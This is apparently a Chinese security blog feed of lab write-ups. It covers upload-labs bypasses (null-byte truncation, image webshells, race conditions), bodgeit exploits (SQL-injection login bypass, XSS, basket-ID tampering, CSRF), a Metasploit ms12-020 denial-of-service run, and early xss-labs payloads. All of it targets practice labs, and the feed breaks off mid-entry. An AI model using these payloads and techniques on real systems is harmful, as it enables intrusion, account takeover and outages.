title="13、PASS-13——目录可控%00截断绕过（POST）"></a>13、PASS-13——目录可控%00截断绕过（POST）</h1><p>上传一个php文件，也显示只允许上传.jpg|.png|.gif类型文件。应该也是设置了白名单，查看源代码。这题的代码好像跟PASS-12差不多耶，先抓包看看，发现明显不同，上一题中的save_path路径以GET方式直接显示出来了，这里的save_path明显是POST方式。所以我们可以用POST方式的%00截断绕过。</p><p>两者的区别就是GET会自行解码，POST不会自行解码，所以POST方式的需要我们手动将%00经过decoode进行解码。</p><p>上传正常的jpg图片，Burp抓包，将../upload/修改为../upload/2.php%00，将jpg图片内容改为php内容，</p><p>然后选中%00按如下方式进行decode，解码成功之后%00会看不见，实际存在。</p><img src="/posts/1702/13.png" class><p>修改完成之后，点击发送，文件上传成功：</p><img src="/posts/1702/13_2.png" class><h1 id="14、PASS-14——图片马绕过"><a href="#14、PASS-14——图片马绕过" class="headerlink" title="14、PASS-14——图片马绕过"></a>14、PASS-14——图片马绕过</h1><p>本题要求：</p><pre class="line-numbers language-bash"><code class="language-bash">上传图片马到服务器。注意：1.保证上传后的图片马中仍然包含完整的一句话或webshell代码。2.使用文件包含漏洞能运行图片马中的恶意代码。3.图片马要.jpg,.png,.gif三种后缀都上传成功才算过关！<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>首先，制作图片马，在cmd中输入：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>生成包含webshell的3.jpg，直接上传3.jpg。</p><p>本题直接说明存在文件上传漏洞：</p><img src="/posts/1702/14.png" class><p>于是，上传之后，抓包，查看文件路径，</p><img src="/posts/1702/14_2.png" class><p>访问：</p><img src="/posts/1702/14_3.png" class><p>.png和.gif的后缀按照同样的方法制作图片马，并上传，能够成功访问：</p><img src="/posts/1702/14_4.png" class><img src="/posts/1702/14_5.png" class><h1 id="15、PASS-15——getimagesize-图片马绕过"><a href="#15、PASS-15——getimagesize-图片马绕过" class="headerlink" title="15、PASS-15——getimagesize()图片马绕过"></a>15、PASS-15——getimagesize()图片马绕过</h1><p>本关卡要求和上一关一样，首先查看源代码，发现有：</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$info</span> <span class="token operator">=</span> getimagesize<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>getimagesize()函数会对目标文件的16进制去进行一个读取，去读取头几个字符串是不是符合图片的要求的。还是制作图片马上传即可。</p><p>制作图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2.php/a 3.jpgcopy 1.png/b+2.php/a 3.pngcopy 1.gif/b+2.php/a 3.gif<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别上传，使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/1702/15.png" class><h1 id="16、PASS-16——exif-imagetype-图片马绕过"><a href="#16、PASS-16——exif-imagetype-图片马绕过" class="headerlink" title="16、PASS-16——exif_imagetype()图片马绕过"></a>16、PASS-16——exif_imagetype()图片马绕过</h1><p>查看源码，exif_imagetype() 读取一个图像的第一个字节并检查其签名。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$image_type</span> <span class="token operator">=</span> exif_imagetype<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>本题需要开启php_exif模块</p><img src="/posts/1702/16.png" class><p>解题过程跟PASS-14和PASS-15一样，利用图片马上传绕过。</p><p>使用文件包含漏洞访问上传的图片马中的恶意代码：</p><img src="/posts/1702/16_2.png" class><h1 id="17、PASS-17——图片二次渲染绕过"><a href="#17、PASS-17——图片二次渲染绕过" class="headerlink" title="17、PASS-17——图片二次渲染绕过"></a>17、PASS-17——图片二次渲染绕过</h1><p>查看源码，发现图片经过了二次渲染。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$im</span> <span class="token operator">=</span> imagecreatefromjpeg<span class="token punctuation">(</span><span class="token variable">$target_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>imagecreatefromjpeg()函数，二次渲染是会创建一个新图像，导致图片马的数据丢失，上传图片马失败。所以要绕过imagecreatefromjpeg()函数进行上传。</p><p>关于gif的图片比较简单：</p><pre class="line-numbers language-bash"><code class="language-bash">原理大致就是先上传一张正常的gif图片，将经过二次渲染的图片下载下来。然后利用工具找到两张图片渲染前后相同的部分，在相同部分写入webshell，再上传，即可成功绕过二次渲染。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>具体步骤，首先，先上传一张正常的图片2.gif，将生成的32421.gif与原来的2.gif进行对比，查找渲染前后没有变化的部分。用一个可以查看十六进制的工具，我用的是winhex，将两张图片放进去，然后在查看处选择同步和比较。</p><img src="/posts/1702/17.png" class><p>这种白色的都是相同的，黑色部分则是不相同的。</p><img src="/posts/1702/17_2.png" class><p>只需要在2.gif的白色部分，即相同部分，插入恶意代码即可。</p><img src="/posts/1702/17_3.png" class><p>将其另存为22.gif，然后上传到服务器。利用文件包含漏洞即可绕过二次渲染。</p><img src="/posts/1702/17_4.png" class><p>至于jpg和png的，用上面这种方法是不行的，你会发现当你在比较渲染前后图片相同位置时，都是一些断断速速的点，根本插不进去的。这里具体的实现还是要利用一些写的脚本，将webshell插入进去。具体实现可以参考[这篇文章](<a href="https://xz.aliyun.com/t/2657">upload-labs之pass 16详细分析 - 先知社区 (aliyun.com)</a>)</p><h1 id="18、PASS-18——条件竞争绕过"><a href="#18、PASS-18——条件竞争绕过" class="headerlink" title="18、PASS-18——条件竞争绕过"></a>18、PASS-18——条件竞争绕过</h1><p>查看源代码，发现本关卡是先将图片上传到服务器，再判断文件后缀是否在白名单，在则重命名，不在则删除。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token variable">$upload_file</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span> <span class="token keyword">.</span> <span class="token variable">$file_name</span><span class="token punctuation">;</span>    if<span class="token punctuation">(</span>move_uploaded_file<span class="token punctuation">(</span><span class="token variable">$temp_file</span>, <span class="token variable">$upload_file</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>        if<span class="token punctuation">(</span>in_array<span class="token punctuation">(</span><span class="token variable">$file_ext</span>,<span class="token variable">$ext_arr</span><span class="token punctuation">))</span><span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>             <span class="token variable">$img_path</span> <span class="token operator">=</span> UPLOAD_PATH <span class="token keyword">.</span> <span class="token string">'/'</span><span class="token keyword">.</span> rand<span class="token punctuation">(</span>10, 99<span class="token punctuation">)</span>.date<span class="token punctuation">(</span><span class="token string">"YmdHis"</span><span class="token punctuation">)</span>.<span class="token string">"."</span><span class="token keyword">.</span><span class="token variable">$file_ext</span><span class="token punctuation">;</span>             rename<span class="token punctuation">(</span><span class="token variable">$upload_file</span>, <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;else&amp;#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"只允许上传.jpg|.png|.gif类型文件！"</span><span class="token punctuation">;</span>            unlink<span class="token punctuation">(</span><span class="token variable">$upload_file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那我们就可以利用条件竞争来绕过。看看谁比谁快（bushi）。如果我们在上传上去的一瞬间访问这个文件，那他就不能对这个文件删除。这就相当于我们打开了一个文件，然后再去删除这个文件，就会提示这个文件在另一程序中打开无法删除。</p><p>上传一个2.php文件，burp抓包，将其发送给测试器Intruder，在position处清除负载。在payloads选择没有负载（Null payloads）,有效载荷选项（payload options）选择无限期地重复（continue indefinitely）。在options处将线程数调高一点，如20。</p><img src="/posts/1702/18.png" class><img src="/posts/1702/18_2.png" class><p>点击攻击，这边在不停的上传：</p><img src="/posts/1702/18_3.png" class><p>我们打开另一个浏览器，访问2.php的路径，找不到我就一直访问，总有你还没来得及删掉的时候吧，然后我第二次就直接访问到啦：</p><img src="/posts/1702/18_4.png" class><h1 id="19、PASS-19——条件竞争绕过"><a href="#19、PASS-19——条件竞争绕过" class="headerlink" title="19、PASS-19——条件竞争绕过"></a>19、PASS-19——条件竞争绕过</h1><p>查看源代码，这关是检查了后缀名，然后上传，然后再进行二次渲染。所以我们只能上传图片马，然后配合解析漏洞（即访问地址加上include.php?file）即可成功绕过。</p><p>这题的上传路径有点问题，没有上传到upload/upload目录下，所以我们先打开PASS-19的myupload.php修改一下路径：</p><img src="/posts/1702/19.png" class><p>先制作一张包含恶意代码的图片马：</p><pre class="line-numbers language-bash"><code class="language-bash">copy 1.jpg/b+2/php/a 3.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后上传3.jpg，并用burp抓包，其他操作跟PASS-18一样，发送到测试器，对它不断进行上传。</p><img src="/posts/1702/19_2.png" class><p>然后打开另一浏览器，不断访问图片地址(<a href="http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg">http://192.168.56.1:8099/upload/include.php?file=upload/3.jpg</a>)</p><img src="/posts/1702/19_3.png" class><h1 id="20、PASS-20——-绕过"><a href="#20、PASS-20——-绕过" class="headerlink" title="20、PASS-20——/.绕过"></a>20、PASS-20——/.绕过</h1><p>查看源代码，本题是设置了一个黑名单，然后发现有一个move_uploaded_file()函数。这个函数有个特性，就是会忽略文件末尾的 /.   (或者用.也可以)</p><p>也就是说，我们先上传一张正常的图片1.jpg，然后用burp抓包，将upload-19.jpg改为2.php/.此时会上传2.php文件，并自动忽略/.后面的内容，即忽略1.jpg</p><img src="/posts/1702/20.png" class><p>还有一个方法。这个函数的img_path是由post参数的save_name控制的。所以可以利用POST方式的%00截断。</p><p>先上传一张正常的图片1.jpg,并用burp抓包，找到save_name,将upload-19.jpg改为2.php%00,并将%00进行url的decode，上传成功</p><img src="/posts/1702/20_2.png" class><h1 id="21、PASS-21——数组绕过"><a href="#21、PASS-21——数组绕过" class="headerlink" title="21、PASS-21——数组绕过"></a>21、PASS-21——数组绕过</h1><p>查看源码，如果是数组的话就不会检查后缀。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>in_array<span class="token punctuation">(</span><span class="token variable">$ext</span>, <span class="token variable">$allow_suffix</span><span class="token punctuation">))</span> <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#123;</span>            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">"禁止上传该后缀文件!"</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span><span class="token comment" spellcheck="true">#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>采用第一个数组和第二个数组拼接</p><pre class="line-numbers language-bash"><code class="language-bash"> <span class="token variable">$file_name</span> <span class="token operator">=</span> reset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token keyword">.</span> <span class="token string">'.'</span> <span class="token keyword">.</span> <span class="token variable">$file</span><span class="token punctuation">[</span>count<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> - 1<span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>那就可以利用数组绕过。</p><p>在这里，数组的下标不能相邻就行，比如第一个数组下标为0，第二个就要大于1，才不会被拼接起来。</p><p>首先，构造表单，能够数组上传，然后上传一张正常的照片1.jpg</p><img src="/posts/1702/21.png" class><p>Burp抓包，点击发送，成功上传</p><img src="/posts/1702/21_2.png" class><h1 id="22、总结"><a href="#22、总结" class="headerlink" title="22、总结"></a>22、总结</h1><p>最后，放上一张关于文件上传漏洞的总结图</p><img src="/posts/1702/22.png" class>]]></content>
    
    
    <categories>
      
      <category>专项靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
      <tag>upload</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>bodgeit靶场</title>
    <link href="/posts/1d0a.html"/>
    <url>/posts/1d0a.html</url>
    
    <content type="html"><![CDATA[<p>这两天在学长的引导下，我把bodgeit靶场练习了一下。以下是我练习的一些关卡。</p><span id="more"></span><p>在About Us中的Scoring page中可以查看关卡：</p><img src="/posts/1d0a/0.png" class><h1 id="1、利用注入漏洞万能密码登录账号"><a href="#1、利用注入漏洞万能密码登录账号" class="headerlink" title="1、利用注入漏洞万能密码登录账号"></a>1、利用注入漏洞万能密码登录账号</h1><p>尝试构造万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">test@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/1.png" class><p>发现登录成功：</p><img src="/posts/1d0a/1_2.png" class><p>可以查看一下源代码，在login.jsp中，</p><img src="/posts/1d0a/1_3.png" class><p>其余两个用户也构造同样的万能密码：</p><pre class="line-numbers language-bash"><code class="language-bash">user1@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span>admin@thebodgeitstore.com<span class="token string">' or '</span>1<span class="token string">'='</span>1<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/1_4.png" class><img src="/posts/1d0a/1_5.png" class><h1 id="2、xss漏洞"><a href="#2、xss漏洞" class="headerlink" title="2、xss漏洞"></a>2、xss漏洞</h1><h2 id="（1）反射型XSS"><a href="#（1）反射型XSS" class="headerlink" title="（1）反射型XSS"></a>（1）反射型XSS</h2><p>发现search模块有个搜索框，尝试使用xss构造。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/1d0a/2.png" class><p>成功出现弹窗，说明存在xss漏洞。</p><img src="/posts/1d0a/2_1.png" class><h2 id="（2）存储型XSS"><a href="#（2）存储型XSS" class="headerlink" title="（2）存储型XSS"></a>（2）存储型XSS</h2><p>既然发现有反射型XSS漏洞，再找找存储型XSS。在Contact Us模块还有一个输入框。先尝试一下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现屏蔽掉了一些关键字：</p><img src="/posts/1d0a/2_2.png" class><p>可能是对某些关键字进行了过滤，再尝试一下大小写绕过：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token operator">&lt;</span>ScRipt<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/ScRipt<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现成功啦！</p><img src="/posts/1d0a/2_3.png" class><p>此时，查看一下源码，发现的确是对<script>和</script>进行特殊处理：</p><img src="/posts/1d0a/2_4.png" class><p>在注册处还存在一个xss，</p><pre class="line-numbers language-bash"><code class="language-bash">注册账号：test@qq.com<span class="token operator">&lt;</span>script<span class="token operator">></span>alert<span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token operator">&lt;</span>/script<span class="token operator">></span>密码：12345<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><img src="/posts/1d0a/2_5.png" class><p>点击register注册后，会：</p><img src="/posts/1d0a/2_6.png" class><h1 id="3、以非管理员用户身份查找隐藏内容"><a href="#3、以非管理员用户身份查找隐藏内容" class="headerlink" title="3、以非管理员用户身份查找隐藏内容"></a>3、以非管理员用户身份查找隐藏内容</h1><p>在普通用户页面，查看源代码，发现有个被注释掉的超链接Admin,而它的页面对应为admin.jsp，有可能是后台</p><img src="/posts/1d0a/3.png" class><p>直接在网址输入即可访问，的确为后台：</p><img src="/posts/1d0a/3_2.png" class><h1 id="4、访问其他人的购物篮"><a href="#4、访问其他人的购物篮" class="headerlink" title="4、访问其他人的购物篮"></a>4、访问其他人的购物篮</h1><p>通过burp，修改b_id值，就可以越权访问其他人的购物篮。 其他人的BasketId在我们之前发现的admin后台处可以直接查看：</p><img src="/posts/1d0a/4.png" class><p>这里我们登录<a href="mailto:&#116;&#101;&#115;&#116;&#64;&#x74;&#x68;&#x65;&#x62;&#111;&#100;&#103;&#101;&#105;&#x74;&#x73;&#116;&#x6f;&#x72;&#101;&#46;&#99;&#x6f;&#x6d;">&#116;&#101;&#115;&#116;&#64;&#x74;&#x68;&#x65;&#x62;&#111;&#100;&#103;&#101;&#105;&#x74;&#x73;&#116;&#x6f;&#x72;&#101;&#46;&#99;&#x6f;&#x6d;</a>这个账号，点击Your Basket界面，并提交到burp</p><img src="/posts/1d0a/4_2.png" class><p>这里我们将b_id值改为10，即查看<a href="mailto:&#x74;&#x65;&#x73;&#x74;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#x74;&#x65;&#x73;&#x74;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a>的购物篮，点击发送：</p><img src="/posts/1d0a/4_3.png" class><p>可以看到，此时，已经出现了<a href="mailto:&#x74;&#x65;&#x73;&#116;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;">&#x74;&#x65;&#x73;&#116;&#x40;&#113;&#x71;&#x2e;&#99;&#x6f;&#109;</a>的购物篮</p><img src="/posts/1d0a/4_4.png" class><h1 id="5、让商店欠你钱"><a href="#5、让商店欠你钱" class="headerlink" title="5、让商店欠你钱"></a>5、让商店欠你钱</h1><p>登录一个普通账号，在Your Basket界面，点击Update Basket，并用burp进行抓取</p><img src="/posts/1d0a/5.png" class><p>直接修改quantity的值，将其变成负数:</p><img src="/posts/1d0a/5_2.png" class><p>然后再发送回来，就可以让数量变成负数，此时的价格当然也变成了负，现在商店要给你付钱啦哈哈哈。</p><img src="/posts/1d0a/5_3.png" class><h1 id="6、CSRF漏洞"><a href="#6、CSRF漏洞" class="headerlink" title="6、CSRF漏洞"></a>6、CSRF漏洞</h1><p>修改密码处有个CSRF漏洞。 登录账号<a href="mailto:&#116;&#x65;&#115;&#116;&#x40;&#x74;&#104;&#x65;&#98;&#111;&#100;&#x67;&#x65;&#x69;&#x74;&#115;&#x74;&#111;&#x72;&#101;&#46;&#99;&#x6f;&#109;">&#116;&#x65;&#115;&#116;&#x40;&#x74;&#104;&#x65;&#98;&#111;&#100;&#x67;&#x65;&#x69;&#x74;&#115;&#x74;&#111;&#x72;&#101;&#46;&#99;&#x6f;&#109;</a>，在修改密码界面，修改密码：</p><img src="/posts/1d0a/6.png" class><p>提交并使用burp抓包，然后选择在burp中右键选择相关工具的CSRF PoC生成：</p><img src="/posts/1d0a/6_2.png" class><p>把POST改为GET:</p><img src="/posts/1d0a/6_3.png" class><p>然后选择用浏览器测试，复制地址：</p><img src="/posts/1d0a/6_4.png" class><p>将复制的地址，先放到浏览器，然后登录另一个账号<a href="mailto:&#117;&#115;&#101;&#x72;&#49;&#64;&#116;&#104;&#101;&#x62;&#111;&#100;&#103;&#101;&#105;&#x74;&#x73;&#116;&#111;&#114;&#x65;&#46;&#99;&#111;&#109;">&#117;&#115;&#101;&#x72;&#49;&#64;&#116;&#104;&#101;&#x62;&#111;&#100;&#103;&#101;&#105;&#x74;&#x73;&#116;&#111;&#114;&#x65;&#46;&#99;&#111;&#109;</a>，此时点击刚刚生成的地址，会发现user1的密码被修改了。</p><img src="/posts/1d0a/6_5.png" class>]]></content>
    
    
    <categories>
      
      <category>综合靶场</category>
      
    </categories>
    
    
    <tags>
      
      <tag>bodgeit</tag>
      
      <tag>靶场</tag>
      
      <tag>Web漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ms12-020-导致对方蓝屏</title>
    <link href="/posts/12eb.html"/>
    <url>/posts/12eb.html</url>
    
    <content type="html"><![CDATA[<p>本篇文章介绍关于msfconsole模块中ms12-020漏洞的解析。</p><span id="more"></span><h1 id="实验背景："><a href="#实验背景：" class="headerlink" title="实验背景："></a>实验背景：</h1><p>    都是在虚拟机下进行的啦，靶机采用的是winxpens3，确保所用的靶机有相关的漏洞才能攻击成功哦。并且攻击机和靶机要处在同一局域网下才行哒，建议开启仅主机模式哦。还有一点，有些命令无效，可能是因为模式为普通用户模式，在命令前面使用sudo就好了，或者切换为root（su root)</p><h1 id="实验环境："><a href="#实验环境：" class="headerlink" title="实验环境："></a>实验环境：</h1><p>攻击机：kali ip地址：192.168.127.139</p><p>靶机：winxpens3 ip地址：192.168.127.138</p><h1 id="ms12-020（导致对方蓝屏）"><a href="#ms12-020（导致对方蓝屏）" class="headerlink" title="ms12-020（导致对方蓝屏）"></a>ms12-020（导致对方蓝屏）</h1><h2 id="1、配置命令"><a href="#1、配置命令" class="headerlink" title="1、配置命令"></a>1、配置命令</h2><p>确定靶机的3389端口打开</p><p>进入msfconsole，配置如下命令：</p><pre class="line-numbers language-bash"><code class="language-bash">search ms12-020   <span class="token comment" spellcheck="true">#查找ms12-020漏洞</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看信息，使用如下，这里因为0已经被修复，所以这里只能使用关于1的，不能使用use 0</p><img src="/posts/12eb/10.png" class><pre class="line-numbers language-bash"><code class="language-bash">use 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或者使用如下，</p><pre class="line-numbers language-bash"><code class="language-bash">use auxiliary/dos/windows/rdp/ms12_020_maxchannelids<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>选择之后，发现提示信息，按照提示信息配置：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">set</span> payload linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/11.png" class><p>然后查看并配置所需命令：</p><pre class="line-numbers language-bash"><code class="language-bash">show options<span class="token keyword">set</span> RHOSTS 192.168.127.138    <span class="token comment" spellcheck="true">#配置靶机地址</span><span class="token keyword">set</span> LHOST 192.168.127.139     <span class="token comment" spellcheck="true">#配置攻击机地址</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、运行攻击"><a href="#2、运行攻击" class="headerlink" title="2、运行攻击"></a>2、运行攻击</h2><p>完成前面的配置之后，运行：</p><pre class="line-numbers language-bash"><code class="language-bash">run       <span class="token comment" spellcheck="true">#或者使用exploit,来实现攻击</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/posts/12eb/12.png" class><p>查看到出现seems down 表示攻击成功，已经致使目标机蓝屏了。</p><img src="/posts/12eb/13.png" class>]]></content>
    
    
    <categories>
      
      <category>内网渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>metasploit</tag>
      
      <tag>操作系统漏洞</tag>
      
      <tag>ms12-020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss靶场</title>
    <link href="/posts/84ce.html"/>
    <url>/posts/84ce.html</url>
    
    <content type="html"><![CDATA[<p>前些时间把xss-labs的靶场练习了一下<span id="more"></span>，其实如果想练习靶场的话，可以是从xss先开始的，sqli练习的我还停留在第四关。xss总共20关，还是好理解一点的，下面是我的一些理解。</p><!--more--><h1 id="基本流程："><a href="#基本流程：" class="headerlink" title="基本流程："></a>基本流程：</h1><p>先输入一个payload，然后查看网页源码，先猜想一下，再去查看原php文件，验证猜想或者找到解题的关键。</p><p>提供一个直接查看源码的快捷方式：ctrl+U,</p><p>或者直接在网址前面输入view-source:   （一样的意思）我个人还是喜欢直接按ctrl+U的方式，比较方便。</p><h1 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h1><p>可以先查看第一关的源码，发现直接将值传递过去了</p><p>在level1.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接将键盘的值传送给了后台</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h1><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/2.png" class>png)<p>&lt;和&gt;都被编码成了html字符实体。</p><p>在level2.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>htmlspecialchars()函数对变量str进行处理之后显示到网页上。(即将&lt;和&gt;都被编码成了html字符实体）但value中并没有使用。</p><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers language-php"><code class="language-php">"<span class="token operator">></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token comment" spellcheck="true">//</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 闭合前面的，注释后面的。</p><h1 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h1><h2 id="尝试："><a href="#尝试：" class="headerlink" title="尝试："></a>尝试：</h2><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'xss'</span><span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>发现没有成功，查看一下源码：</p><img src="/posts/84ce/3.png" class><p>在level3.php中：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>"<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span><span class="token punctuation">"</span>.htmlspecialchars($str).<span class="token punctuation">"</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>两处都使用了htmlspecialchars()函数，就不能使用带有&lt;或&gt;</p><h2 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h2><pre class="line-numbers 